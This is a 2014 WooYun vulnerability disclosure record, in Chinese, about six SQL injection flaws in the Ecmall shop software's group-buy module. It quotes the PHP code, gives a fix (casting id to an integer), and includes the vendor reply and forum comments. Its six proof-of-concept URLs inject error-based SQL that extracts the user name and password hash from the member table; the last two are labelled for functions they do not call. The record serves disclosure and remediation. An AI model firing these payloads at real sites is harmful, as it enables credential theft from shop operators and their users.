{"id": 1449, "wybug_id": "wooyun-2014-064371", "wybug_title": "Ecmall的几处SQL注射漏洞", "wybug_corp": "ShopEx", "wybug_author": "HackBraid", "wybug_date": "2014-06-13 22:32", "wybug_open_date": "2014-09-11 22:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向公众公开  简要描述： RT 详细说明：  搜了下，发现/app/seller_groupbuy.app.php里面还有6处注入：分别是该文件下drop(),start(),finished(),desc(),cancel(),log()函数中的id参数以finished()为例：\nfunction finished()    {        $id = empty($_GET['id']) ? 0 : $_GET['id'];//id参数未过滤        if (!$id)        {            $this->show_warning('no_such_groupbuy');            return false;        }        if (!$this->_ican($id, ACT)) //进入_ican函数，跟进        {            $this->show_warning('Hacking Attempt');            return;        }        /* 团购信息 */        $group = $this->_groupbuy_mod->get(array(            'conditions' => 'group_id=' . $id,            'fields'     => 'group_name',        ));        if (!$this->_groupbuy_mod->edit($id, array('state' => GROUP_FINISHED, 'end_time' => gmtime())))        {            $this->show_warning($this->_groupbuy_mod->get_error());            return;        }        $content = get_msg('tobuyer_groupbuy_finished_notify', array('group_name' => $group['group_name'], 'id' => $id));        $this->_groupbuy_mod->sys_notice(            $id,            array('buyer'),            '',            $content,            array('msg')        );        $this->show_message('finished_ok');    }\n_ican函数代码：\nfunction _ican($id, $act = '')    {        $state_permission = array(            GROUP_PENDING   => array('start', 'edit', 'drop'),            GROUP_ON        => array('cancel', 'desc', 'log', 'finished', 'export_ubbcode'),            GROUP_END       => array('cancel', 'desc', 'finished', 'log'),            GROUP_FINISHED  => array('drop', 'log', 'view_order'),            GROUP_CANCELED  => array('drop', 'log')        );        $group = $this->_groupbuy_mod->get(array(            'join'       => 'belong_goods',            'conditions' => 'gb.group_id=' . $id . ' AND g.store_id=' . $this->_store_id,// id参数未过滤直接带入查询            'fields'     => 'gb.state',        ));        if (!$group)        {            return false; // 越权或没有该团购        }        if (empty($act))        {            return $state_permission[$group['state']]; // 返回该团购此状态时允许的操作        }        return in_array($act, $state_permission[$group['state']]) ? true : false; // 该团购此状态是否允许执行此操作    }\n   漏洞证明：  exp1（finished函数）：\nhttp://localhost/ecmall/index.php?app=seller_groupbuy&act=finished&id=2%20and%20(select%20user_name%20from%20ecm_member%20where%20user_id=1%20union%20select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(user_name,password)%20from%20ecm_member%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)#\n\n\nexp2（drop函数）：\nhttp://localhost/ecmall/index.php?app=seller_groupbuy&act=drop&id=2%20and%20(select%20user_name%20from%20ecm_member%20where%20user_id=1%20union%20select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(user_name,password)%20from%20ecm_member%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)#\nexp3（srart函数）：\nhttp://localhost/ecmall/index.php?app=seller_groupbuy&act=start&id=2%20and%20(select%20user_name%20from%20ecm_member%20where%20user_id=1%20union%20select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(user_name,password)%20from%20ecm_member%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)#\nexp4:（desc函数）：\nhttp://localhost/ecmall/index.php?app=seller_groupbuy&act=desc&id=2%20and%20(select%20user_name%20from%20ecm_member%20where%20user_id=1%20union%20select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(user_name,password)%20from%20ecm_member%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)#\nexp5:（cancel函数）：\nhttp://localhost/ecmall/index.php?app=seller_groupbuy&act=desc&id=2%20and%20(select%20user_name%20from%20ecm_member%20where%20user_id=1%20union%20select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(user_name,password)%20from%20ecm_member%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)#\nexp6:（log函数）：\nhttp://localhost/ecmall/index.php?app=seller_groupbuy&act=desc&id=2%20and%20(select%20user_name%20from%20ecm_member%20where%20user_id=1%20union%20select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(user_name,password)%20from%20ecm_member%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)#\n   修复方案：  对id进行intval整形转换   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-06-18 08:41 厂商回复： 非常感谢您为shopex信息安全做的贡献漏洞已经提交过，并在处理中非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-13 23:02 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  good。    \n     2014-06-13 23:11 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  good    \n     2014-06-14 09:00 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @寂寞的瘦子 study day day up    \n     2014-06-14 09:03 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @ShopEx 确认确认！打了你们最新补丁测试的    \n     2014-06-14 09:36 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n   。。  哪里还在出补丁啊？ 我也打上试试，    \n     2014-06-14 09:56 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @′  雨。 官网。。。    \n     2014-06-14 22:51 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @HackBraid 能给个地址不我还是没找到。。。。    \n     2014-06-16 12:14 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @ShopEx 忽略的节奏...语句的参数是没过滤直接带入查询了,危害很大呀    \n     2014-06-16 12:38 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @HackBraid   order by？    \n     2014-06-16 13:35 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @′  雨。 好好学习～    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}